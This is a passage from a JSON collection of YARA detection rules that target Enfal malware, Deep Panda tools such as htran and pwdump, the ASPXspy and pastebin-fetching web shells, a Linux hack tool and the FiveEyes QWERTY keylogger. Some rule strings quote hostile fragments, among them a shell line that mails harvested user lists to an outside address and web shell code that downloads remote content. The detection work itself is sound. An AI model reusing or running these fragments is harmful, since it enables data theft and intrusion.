set\"\n      date = \"2015-02-10 09:35:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"POWERPNT.exe\" fullword ascii\n      $s1 = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n      $s2 = \"%HOMEPATH%\" fullword ascii\n      $s3 = \"Server2008\" fullword ascii\n      $s4 = \"Server2003\" fullword ascii\n      $s5 = \"Server2003R2\" fullword ascii\n      $s6 = \"Server2008R2\" fullword ascii\n      $s9 = \"%HOMEDRIVE%\" fullword ascii\n      $s13 = \"%ComSpec%\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-02-10 09:35:41","description":"Detects a certain type of Enfal Malware","minimum_yara":"1.7","name":"Enfal_Malware_RID2C1F","reference":"not set","required_modules":[],"rule_hash":"e8d78d2acb0206721d19546f7a5538af","score":60,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule DeepPanda_sl_txt_packed_RID3037 : APT CHINA DEMO T1045 {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - ScanLine sl-txt-packed\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 12:30:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Command line port scanner\" fullword wide\n      $s1 = \"sl.exe\" fullword wide\n      $s2 = \"CPports.txt\" fullword ascii\n      $s3 = \",GET / HTTP/.}\" fullword ascii\n      $s4 = \"Foundstone Inc.\" fullword wide\n      $s9 = \" 2002 Foundstone Inc.\" fullword wide\n      $s15 = \", Inc. 2002\" fullword ascii\n      $s20 = \"ICMP Time\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-02-08 12:30:21","description":"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - ScanLine sl-txt-packed","minimum_yara":"1.7","name":"DeepPanda_sl_txt_packed_RID3037","reference":"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf","required_modules":[],"rule_hash":"fc53e2d0d744abfe0b47fe0c02e96892","score":60,"tags":["APT","DEMO","CHINA","T1045"]},{"author":"Florian Roth","content":"rule DeepPanda_lot1_RID2C52 : APT CHINA DEMO T1003 {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - lot1.tmp-pwdump\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 09:44:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Unable to open target process: %d, pid %d\" fullword ascii\n      $s1 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n      $s2 = \"Target: Failed to load SAM functions.\" fullword ascii\n      $s5 = \"Error writing the test file %s, skipping this share\" fullword ascii\n      $s6 = \"Failed to create service (%s/%s), error %d\" fullword ascii\n      $s8 = \"Service start failed: %d (%s/%s)\" fullword ascii\n      $s12 = \"PwDump.exe\" fullword ascii\n      $s13 = \"GetAvailableWriteableShare returned an error of %ld\" fullword ascii\n      $s14 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n      $s15 = \"Couldn't copy %s to destination %s. (Error %d)\" fullword ascii\n      $s16 = \"dump logon session\" fullword ascii\n      $s17 = \"Timed out waiting to get our pipe back\" fullword ascii\n      $s19 = \"SetNamedPipeHandleState failed, error %d\" fullword ascii\n      $s20 = \"%s\\\\%s.exe\" fullword ascii\n   condition: \n      10 of them\n}","date":"2015-02-08 09:44:11","description":"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - lot1.tmp-pwdump","minimum_yara":"1.7","name":"DeepPanda_lot1_RID2C52","reference":"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf","required_modules":[],"rule_hash":"81138d1ebad2ed4de9c93f6196797858","score":80,"tags":["APT","DEMO","CHINA","T1003"]},{"author":"Florian Roth","content":"rule DeepPanda_htran_exe_RID2E90 : APT CHINA DEMO T1020 T1090 {\n   meta:\n      description = \"Hack Deep Panda - htran-exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-02-08 11:19:51\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $s2 = \"\\\\Release\\\\htran.pdb\" ascii\n      $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s8 = \"======================== htran V%s =======================\" fullword ascii\n      $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s15 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $s20 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n   condition: \n      1 of them\n}","date":"2015-02-08 11:19:51","description":"Hack Deep Panda - htran-exe","minimum_yara":"1.7","name":"DeepPanda_htran_exe_RID2E90","reference":"-","required_modules":[],"rule_hash":"b945cd4ac408326375d2788d5a10b76f","score":100,"tags":["APT","T1090","DEMO","CHINA","T1020"]},{"author":"Florian Roth","content":"rule DeepPanda_Trojan_Kakfum_RID2FFE : APT CHINA DEMO MAL {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - Trojan.Kakfum sqlsrv32.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 12:20:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k sqlserver\" fullword ascii\n      $s1 = \"%s\\\\sqlsrv32.dll\" fullword ascii\n      $s2 = \"%s\\\\sqlsrv64.dll\" fullword ascii\n      $s3 = \"%s\\\\%d.tmp\" fullword ascii\n      $s4 = \"ServiceMaix\" fullword ascii\n      $s15 = \"sqlserver\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-02-08 12:20:51","description":"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - Trojan.Kakfum sqlsrv32.dll","minimum_yara":"1.7","name":"DeepPanda_Trojan_Kakfum_RID2FFE","reference":"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf","required_modules":[],"rule_hash":"4dcd758d4ec3ae58da77ba1b594db1f0","score":80,"tags":["APT","DEMO","CHINA","MAL"]},{"author":"Florian Roth","content":"rule ASPXspy2_RID29DB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shell - file ASPXspy2_RID29DB.aspx\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-01-24 01:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"string iVDT=\\\"-SETUSERSETUP\\\\r\\\\n-IP=0.0.0.0\\\\r\\\\n-PortNo=52521\\\\r\\\\n-User=bin\" ascii\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s3 = \"Process[] p=Process.GetProcesses();\" fullword ascii\n      $s4 = \"Response.Cookies.Add(new HttpCookie(vbhLn,Password));\" fullword ascii\n      $s5 = \"[DllImport(\\\"kernel32.dll\\\",EntryPoint=\\\"GetDriveTypeA\\\")]\" fullword ascii\n      $s6 = \"<p>ConnString : <asp:TextBox id=\\\"MasR\\\" style=\\\"width:70%;margin:0 8px;\\\" CssCl\" ascii\n      $s7 = \"ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();\" fullword ascii\n      $s8 = \"Copyright &copy; 2009 Bin -- <a href=\\\"http://www.rootkit.net.cn\\\" target=\\\"_bla\" ascii\n      $s10 = \"Response.AddHeader(\\\"Content-Disposition\\\",\\\"attachment;filename=\\\"+HttpUtility.\" ascii\n      $s11 = \"nxeDR.Command+=new CommandEventHandler(this.iVk);\" fullword ascii\n      $s12 = \"<%@ import Namespace=\\\"System.ServiceProcess\\\"%>\" fullword ascii\n      $s13 = \"foreach(string innerSubKey in sk.GetSubKeyNames())\" fullword ascii\n      $s17 = \"Response.Redirect(\\\"http://www.rootkit.net.cn\\\");\" fullword ascii\n      $s20 = \"else if(Reg_Path.StartsWith(\\\"HKEY_USERS\\\"))\" fullword ascii\n   condition: \n      6 of them\n}","date":"2015-01-24 01:50:01","description":"Web shell - file ASPXspy2.aspx","minimum_yara":"1.7","name":"ASPXspy2_RID29DB","reference":"not set","required_modules":[],"rule_hash":"64bcf8b4482b74a98f0785ef682a7b43","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {\n   meta:\n      description = \"Linux hack tools - file a\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-01-19 11:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n      $s1 = \"mv scan.log bios.txt\" fullword ascii\n      $s2 = \"rm -rf bios.txt\" fullword ascii\n      $s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n      $s4 = \"././pscan2 $1 22\" fullword ascii\n      $s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n   condition: \n      2 of them\n}","date":"2015-01-19 11:45:41","description":"Linux hack tools - file a","minimum_yara":"1.7","name":"LinuxHacktool_eyes_a_RID2F2B","reference":"not set","required_modules":[],"rule_hash":"ce6d21d7c5d0d460e898f74a8ea750d0","score":75,"tags":["DEMO","LINUX","HKTL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20121_dll_RID33D5 : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121.dll.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WarriorPride\\\\production2.0\\\\package\\\\E_Wzowski\" ascii\n      $s1 = \"20121.dll\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-01-18 15:04:41","description":"FiveEyes QUERTY Malware - file 20121.dll.bin","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20121_dll_RID33D5","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"14786683533096ddd7ffd1ca359e64d8","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwareqwerty_20121_RID33A3 : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<configFileName>20121_cmdDef.xml</configFileName>\" fullword ascii\n      $s1 = \"<name>20121.dll</name>\" fullword ascii\n      $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s5 = \"</plugin>\" fullword ascii\n      $s6 = \"</pluginConfig>\" fullword ascii\n      $s7 = \"<pluginConfig>\" fullword ascii\n      $s8 = \"</platform>\" fullword ascii\n      $s9 = \"</lpConfig>\" fullword ascii\n      $s10 = \"<lpConfig>\" fullword ascii\n   condition: \n      9 of them\n}","date":"2015-01-18 14:56:21","description":"FiveEyes QUERTY Malware - file 20121.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwareqwerty_20121_RID33A3","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"20675c5a33fcbb81d289a3dd4dd06527","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20123_sys_RID33FA : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123.sys.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"20123.dll\" fullword ascii\n      $s1 = \"kbdclass.sys\" fullword wide\n      $s2 = \"IoFreeMdl\" fullword ascii\n      $s3 = \"ntoskrnl.exe\" fullword ascii\n      $s4 = \"KfReleaseSpinLock\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-01-18 15:10:51","description":"FiveEyes QUERTY Malware - file 20123.sys.bin","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20123_sys_RID33FA","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"3bf8d87197575d4c66061baaeaf56fd5","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20123_cmdDef_RID34DE : APT DEMO MAL T1220 {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, T1220\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<shortDescription>Keystroke Collector</shortDescription>\" fullword ascii\n      $s1 = \"This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>\" fullword ascii\n      $s2 = \"<commands/>\" fullword ascii\n      $s3 = \"</version>\" fullword ascii\n      $s4 = \"<associatedImplantId>20121</associatedImplantId>\" fullword ascii\n      $s5 = \"<rightsRequired>System or Administrator (if Administrator, I think the DriverIns\" ascii\n      $s6 = \"<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64\" ascii\n      $s7 = \"<projectpath>plugin/Collection</projectpath>\" fullword ascii\n      $s8 = \"<dllDepend>None</dllDepend>\" fullword ascii\n      $s9 = \"<minorType>0</minorType>\" fullword ascii\n      $s10 = \"<pluginname>E_QwertyKM</pluginname>\" fullword ascii\n      $s11 = \"</comments>\" fullword ascii\n      $s12 = \"<comments>\" fullword ascii\n      $s13 = \"<majorType>1</majorType>\" fullword ascii\n      $s14 = \"<files>None</files>\" fullword ascii\n      $s15 = \"<poc>Erebus</poc>\" fullword ascii\n      $s16 = \"</plugin>\" fullword ascii\n      $s17 = \"<team>None</team>\" fullword ascii\n      $s18 = \"<?xml-stylesheet type=\\\"text/xsl\\\" href=\\\"../XSLT/pluginHTML.xsl\\\"?>\" fullword ascii\n      $s19 = \"<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>\" fullword ascii\n      $s20 = \"<plugin id=\\\"20123\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi\" ascii\n   condition: \n      14 of them\n}","date":"2015-01-18 15:48:51","description":"FiveEyes QUERTY Malware - file 20123_cmdDef.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20123_cmdDef_RID34DE","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"28f695302224954d50a138f4e679fdf6","score":75,"tags":["APT","DEMO","T1220","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwareqwerty_20123_RID33A5 : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -\" ascii\n      $s1 = \"<configFileName>20123_cmdDef.xml</configFileName>\" fullword ascii\n      $s2 = \"<name>20123.sys</name>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<codebase>/bin/i686-pc-win32/debug</codebase>\" fullword ascii\n      $s5 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s6 = \"</plugin>\" fullword ascii\n      $s7 = \"</pluginConfig>\" fullword ascii\n      $s8 = \"<pluginConfig>\" fullword ascii\n      $s9 = \"</platform>\" fullword ascii\n      $s10 = \"</lpConfig>\" fullword ascii\n      $s11 = \"<lpConfig>\" fullword ascii\n   condition: \n      9 of them\n}","date":"2015-01-18 14:56:41","description":"FiveEyes QUERTY Malware - file 20123.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwareqwerty_20123_RID33A5","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"8ac6aa4b3cdebe7b16fd6c1f4991cb96","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20120_dll_RID33D4 : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120.dll.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt\" fullword wide\n      $s1 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml\" fullword wide\n      $s2 = \"Failed to send the EQwerty_driverStatusCommand to the implant.\" fullword ascii\n      $s3 = \"- Log Used (number of windows) - %d\" fullword wide\n      $s4 = \"- Log Limit (number of windows) - %d\" fullword wide\n      $s5 = \"Process or User Default Language\" fullword wide\n      $s6 = \"Windows 98/Me, Windows NT 4.0 and later: Vietnamese\" fullword wide\n      $s7 = \"- Logging of keystrokes is switched ON\" fullword wide\n      $s8 = \"- Logging of keystrokes is switched OFF\" fullword wide\n      $s9 = \"Qwerty is currently logging active windows with titles containing the fo\" wide\n      $s10 = \"Windows 95, Windows NT 4.0 only: Korean (Johab)\" fullword wide\n      $s11 = \"FAILED to get Qwerty Status\" fullword wide\n      $s12 = \"- Successfully retrieved Log from Implant.\" fullword wide\n      $s13 = \"- Logging of all Windows is toggled ON\" fullword wide\n      $s14 = \"- Logging of all Windows is toggled OFF\" fullword wide\n      $s15 = \"Qwerty FAILED to retrieve window list.\" fullword wide\n      $s16 = \"- UNSUCCESSFUL Log Retrieval from Implant.\" fullword wide\n      $s17 = \"The implant failed to return a valid status\" fullword ascii\n      $s18 = \"- Log files were NOT generated!\" fullword wide\n      $s19 = \"Windows 2000/XP: Armenian. This is Unicode only.\" fullword wide\n      $s20 = \"- This machine is using a PS/2 Keyboard - Continue on using QWERTY\" fullword wide\n   condition: \n      10 of them\n}","date":"2015-01-18 15:04:31","description":"FiveEyes QUERTY Malware - file 20120.dll.bin","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20120_dll_RID33D4","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"95ac49aa25e59a6c6860894cd75dcdd5","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20120_cmdDef_RID34DB : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"This PPC gets the current keystroke log.\" fullword ascii\n      $s1 = \"This command will add the given WindowTitle to the list of Windows to log keys f\" ascii\n      $s2 = \"This command will remove the WindowTitle corresponding to the given window title\" ascii\n      $s3 = \"This command will return the current status of the Keyboard Logger (Whether it i\" ascii\n      $s4 = \"This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w\" ascii\n      $s5 = \"<definition>Turn logging of all keys on|off</definition>\" fullword ascii\n      $s6 = \"<name>Get Keystroke Log</name>\" fullword ascii\n      $s7 = \"<description>Keystroke Logger Lp Plugin</description>\" fullword ascii\n      $s8 = \"<definition>display help for this function</definition>\" fullword ascii\n      $s9 = \"This command will switch ON Logging of keys. All keys taht are entered to a acti\" ascii\n      $s10 = \"Set the log limit (in number of windows)\" fullword ascii\n      $s11 = \"<example>qwgetlog</example>\" fullword ascii\n      $s12 = \"<aliasName>qwgetlog</aliasName>\" fullword ascii\n      $s13 = \"<definition>The title of the Window whose keys you wish to Log once it becomes a\" ascii\n      $s14 = \"This command will switch OFF Logging of keys. No keystrokes will be captured\" fullword ascii\n      $s15 = \"<definition>The title of the Window whose keys you no longer whish to log</defin\" ascii\n      $s16 = \"<command id=\\\"32\\\">\" fullword ascii\n      $s17 = \"<command id=\\\"3\\\">\" fullword ascii\n      $s18 = \"<command id=\\\"7\\\">\" fullword ascii\n      $s19 = \"<command id=\\\"1\\\">\" fullword ascii\n      $s20 = \"<command id=\\\"4\\\">\" fullword ascii\n   condition: \n      10 of them\n}","date":"2015-01-18 15:48:21","description":"FiveEyes QUERTY Malware - file 20120_cmdDef.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20120_cmdDef_RID34DB","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"98190776e0f106edc063d5efb43e4432","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwareqwerty_20120_RID33A2 : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<configFileName>20120_cmdDef.xml</configFileName>\" fullword ascii\n      $s1 = \"<name>20120.dll</name>\" fullword ascii\n      $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s5 = \"</plugin>\" fullword ascii\n      $s6 = \"</pluginConfig>\" fullword ascii\n      $s7 = \"<pluginConfig>\" fullword ascii\n      $s8 = \"</platform>\" fullword ascii\n      $s9 = \"</lpConfig>\" fullword ascii\n      $s10 = \"<lpConfig>\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-01-18 14:56:11","description":"FiveEyes QUERTY Malware - file 20120.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwareqwerty_20120_RID33A2","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"ce68ef98fd0d7e9290d25252da563d6e","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule FiveEyes_QUERTY_Malwaresig_20121_cmdDef_RID34DC : APT DEMO MAL {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<shortDescription>Keystroke Logger Plugin.</shortDescription>\" fullword ascii\n      $s1 = \"<message>Failed to get File Time</message>\" fullword ascii\n      $s2 = \"<description>Keystroke Logger Plugin.</description>\" fullword ascii\n      $s3 = \"<message>Failed to set File Time</message>\" fullword ascii\n      $s4 = \"</commands>\" fullword ascii\n      $s5 = \"<commands>\" fullword ascii\n      $s6 = \"</version>\" fullword ascii\n      $s7 = \"<associatedImplantId>20120</associatedImplantId>\" fullword ascii\n      $s8 = \"<message>No Comms. with Driver</message>\" fullword ascii\n      $s9 = \"</error>\" fullword ascii\n      $s10 = \"<message>Invalid File Size</message>\" fullword ascii\n      $s11 = \"<platforms>Windows (User/Win32)</platforms>\" fullword ascii\n      $s12 = \"<message>File Size Mismatch</message>\" fullword ascii\n      $s13 = \"<projectpath>plugin/Utility</projectpath>\" fullword ascii\n      $s14 = \"<pluginsDepend>None</pluginsDepend>\" fullword ascii\n      $s15 = \"<dllDepend>None</dllDepend>\" fullword ascii\n      $s16 = \"<pluginname>E_QwertyIM</pluginname>\" fullword ascii\n      $s17 = \"<rightsRequired>None</rightsRequired>\" fullword ascii\n      $s18 = \"<minorType>0</minorType>\" fullword ascii\n      $s19 = \"<code>00001002</code>\" fullword ascii\n      $s20 = \"<code>00001001</code>\" fullword ascii\n   condition: \n      12 of them\n}","date":"2015-01-18 15:48:31","description":"FiveEyes QUERTY Malware - file 20121_cmdDef.xml","minimum_yara":"1.7","name":"FiveEyes_QUERTY_Malwaresig_20121_cmdDef_RID34DC","reference":"http://www.spiegel.de/media/media-35668.pdf","required_modules":[],"rule_hash":"2a2baaea3b522b7754109296c266a2e0","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule Pastebin_Webshell_RID2DDC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/7dbyZs\"\n      date = \"2015-01-13 10:49:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"file_get_contents(\\\"http://pastebin.com\" ascii\n      $s1 = \"xcurl('http://pastebin.com/download.php\" ascii\n      $s2 = \"xcurl('http://pastebin.com/raw.php\" ascii\n      $x0 = \"if($content){unlink('evex.php');\" ascii\n      $x1 = \"$fh2 = fopen(\\\"evex.php\\\", 'a');\" ascii\n      $y0 = \"file_put_contents($pth\" ascii\n      $y1 = \"echo \\\"<login_ok>\" ascii\n      $y2 = \"str_replace('* @package Wordpress',$temp\" ascii\n   condition: \n      1 of ( $s* ) or all of ( $x* ) or all of ( $y* )\n}","date":"2015-01-13 10:49:51","description":"Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs","minimum_yara":"1.7","name":"Pastebin_Webshell_RID2DDC","reference":"http://goo.gl/7dbyZs","required_modules":[],"rule_hash":"25f212d9622c34bc411fd0d94f0978e5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CoreImpact_sysdll_exe_RID2F93 : APT DEMO MIDDLE_EAST {\n   meta:\n      description = \"Detects a malware sysdll.exe from the Rocket Kitten APT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-27 12:03:01\"\n      score = 70\n      customer = \"demo\"\n      